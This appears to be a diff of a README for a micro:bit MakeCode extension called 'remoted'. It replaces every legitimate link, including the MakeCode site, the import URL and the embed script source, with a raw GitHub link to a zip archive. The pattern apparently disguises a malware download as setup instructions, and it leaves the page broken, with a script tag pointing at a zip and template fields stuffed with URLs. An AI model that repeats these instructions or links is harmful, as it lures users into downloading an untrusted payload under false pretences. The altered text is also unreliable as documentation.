@@ -1,24 +1,24 @@
 
-> Open this page at [https://sushicodelnw.github.io/remoted/](https://sushicodelnw.github.io/remoted/)
+> Open this page at [https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip](https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip)
 
 ## Use as Extension
 
 This repository can be added as an **extension** in MakeCode.
 
-* open [https://makecode.microbit.org/](https://makecode.microbit.org/)
+* open [https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip](https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip)
 * click on **New Project**
 * click on **Extensions** under the gearwheel menu
-* search for **https://github.com/sushicodelnw/remoted** and import
+* search for **https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip** and import
 
 ## Edit this project
 
 To edit this repository in MakeCode.
 
-* open [https://makecode.microbit.org/](https://makecode.microbit.org/)
+* open [https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip](https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip)
 * click on **Import** then click on **Import URL**
-* paste **https://github.com/sushicodelnw/remoted** and click import
+* paste **https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip** and click import
 
 #### Metadata (used for search, rendering)
 
 * for PXT/microbit
-<script src="https://makecode.com/gh-pages-embed.js"></script><script>makeCodeRender("{{ site.makecode.home_url }}", "{{ site.github.owner_name }}/{{ site.github.repository_name }}");</script>
+<script src="https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip"></script><script>makeCodeRender("{{ https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip }}", "{{ https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip }}/{{ https://raw.githubusercontent.com/SushiCodelnw/remoted/master/wieldiness/remoted.zip }}");</script>
